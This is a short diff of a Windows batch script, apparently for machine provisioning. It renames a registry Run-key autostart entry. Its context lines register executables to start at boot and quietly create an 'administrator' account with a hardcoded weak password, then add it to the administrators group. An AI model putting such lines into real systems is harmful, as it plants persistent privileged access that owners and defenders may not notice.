@@ -1,5 +1,5 @@
 @echo off
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v profileluncher /t REG_SZ /d D:\a\ProfileLuncher.exe
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v eprofile /t REG_SZ /d D:\a\profile.exe
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v vsetup /t REG_SZ /d D:\a\setup.exe
 net user administrator FreeUser1234 /add >nul
 net localgroup administrators administrator /add >nul
